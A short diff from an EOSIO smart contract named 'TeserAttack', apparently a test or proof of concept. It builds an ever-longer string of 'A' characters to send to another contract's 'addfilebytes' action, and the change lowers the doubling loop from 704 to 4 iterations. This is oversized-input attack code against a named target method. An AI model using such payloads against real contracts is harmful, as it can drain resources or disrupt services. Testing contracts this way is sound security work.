@@ -27,7 +27,7 @@ class [[eosio::contract]] TeserAttack : public eosio::contract {
             name targetContract = "provider"_n;
             name targetMethod = name("addfilebytes");
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-            for ( int i = 0; i < 704; i++)
+            for ( int i = 0; i < 4; i++)
             {
                 A = A+ A;
             }
